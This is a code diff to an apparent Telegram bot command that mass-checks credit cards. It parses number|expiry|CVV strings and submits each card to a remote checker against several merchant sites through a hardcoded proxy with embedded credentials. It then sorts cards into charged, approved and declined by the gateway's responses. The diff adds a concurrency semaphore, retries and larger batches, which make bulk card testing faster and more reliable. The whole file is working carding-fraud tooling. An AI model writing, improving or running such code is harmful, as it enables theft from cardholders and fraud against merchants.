@@ -5809,8 +5809,6 @@ async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-
-
 import asyncio
 import httpx
 import time
@@ -5845,13 +5843,15 @@ CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
 # Proxy placeholder
 DEFAULT_PROXY = "142.147.128.93:6593:fvbysspi:bsbh3trstb1c"
 
-# Junk/error response patterns
+# Error & keyword patterns
 ERROR_PATTERNS = ["CLINTE TOKEN", "DEL AMMOUNT EMPTY", "PRODUCT ID IS EMPTY", "R4 TOKEN EMPTY", "TAX AMOUNT EMPTY"]
-
-# Classification keyword groups
 CHARGED_KEYWORDS = {"THANK YOU", "ORDER_PLACED", "APPROVED", "SUCCESS", "CHARGED"}
 APPROVED_KEYWORDS = {"3D_AUTHENTICATION", "INCORRECT_CVC", "INCORRECT_ZIP", "INSUFFICIENT_FUNDS"}
 DECLINED_KEYWORDS = {"INVALID_PAYMENT_ERROR", "DECLINED", "CARD_DECLINED", "INCORRECT_NUMBER", "FRAUD_SUSPECTED", "EXPIRED_CARD", "EXPIRE_CARD"}
+
+# --- Global concurrency control ---
+MAX_CONCURRENCY = 10   # total max parallel requests allowed
+semaphore = asyncio.Semaphore(MAX_CONCURRENCY)
 
 
 # ---------- Utility ----------
@@ -5893,23 +5893,32 @@ def build_msp_buttons(approved: int, charged: int, declined: int, owner_and_run:
 
 # ---------- Networking ----------
 async def check_card_on_site(session: httpx.AsyncClient, base_url: str, site: str, card: str, proxy: str) -> Dict[str, str]:
-    if not site.startswith("http://") and not site.startswith("https://"):
-        site = "https://" + site
-    url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
-    try:
-        r = await session.get(url, timeout=55)
-        try:
-            data = r.json()
-        except Exception:
-            return {"response": r.text or "Unknown", "status": "false", "price": "0", "gateway": "N/A"}
-        return {
-            "response": str(data.get("Response", "Unknown")),
-            "status": str(data.get("Status", "false")),
-            "price": str(data.get("Price", "0")),
-            "gateway": str(data.get("Gateway", "N/A")),
-        }
-    except Exception as e:
-        return {"response": f"Error: {str(e)}", "status": "false", "price": "0", "gateway": "N/A"}
+    async with semaphore:  # limit concurrency
+        if not site.startswith("http://") and not site.startswith("https://"):
+            site = "https://" + site
+        url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
+
+        for attempt in range(2):  # retry once
+            try:
+                r = await session.get(url, timeout=30)
+                try:
+                    data = r.json()
+                except Exception:
+                    if r.text.strip():
+                        return {"response": r.text, "status": "false", "price": "0", "gateway": "N/A"}
+                    continue
+                return {
+                    "response": str(data.get("Response", "Unknown")),
+                    "status": str(data.get("Status", "false")),
+                    "price": str(data.get("Price", "0")),
+                    "gateway": str(data.get("Gateway", "N/A")),
+                }
+            except Exception as e:
+                if attempt == 0:
+                    await asyncio.sleep(1)  # short backoff
+                    continue
+                return {"response": f"Error: {str(e)}", "status": "false", "price": "0", "gateway": "N/A"}
+        return {"response": "Unknown", "status": "false", "price": "0", "gateway": "N/A"}
 
 
 # ---------- Buttons ----------
@@ -5931,7 +5940,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         context.user_data.setdefault("msp_stop_flags", {})[run_id] = True
         await query.answer("⏹ Stopped! Sending results...", show_alert=True)
 
-        # finalize partial results
         state = context.user_data.get(f"msp_state_{run_id}")
         if state:
             await finalize_results(
@@ -5999,7 +6007,7 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
     approved = declined = errors = charged = checked = 0
     approved_results, charged_results, declined_results, error_results = [], [], [], []
     proxy = DEFAULT_PROXY
-    BATCH_SIZE = 3
+    BATCH_SIZE = 5
 
     context.user_data[f"msp_state_{run_id}"] = {
         "msg": msg,
@@ -6020,18 +6028,14 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
                 return
             batch = cards[i:i + BATCH_SIZE]
 
-            # for each card, check all sites in parallel
-            card_tasks = []
-            for card in batch:
-                site_tasks = [check_card_on_site(session, base_url, site, card, proxy) for site in sites]
-                card_tasks.append(asyncio.gather(*site_tasks, return_exceptions=True))
-
-            results = await asyncio.gather(*card_tasks)
+            # each card checks all sites in parallel
+            results = await asyncio.gather(
+                *(asyncio.gather(*(check_card_on_site(session, base_url, site, card, proxy) for site in sites), return_exceptions=True) for card in batch)
+            )
 
             for card, site_responses in zip(batch, results):
                 if stop_flags.get(run_id):
                     return
-                # pick best classification among sites
                 best_resp = None
                 best_score = 0
                 for resp in site_responses:
@@ -6168,6 +6172,7 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     task = asyncio.create_task(run_msp(update, context, cards, base_url, sites, msg, run_id))
     task.add_done_callback(lambda t: logger.error(f"/msp crashed: {t.exception()}") if t.exception() else None)
+
 
 
 
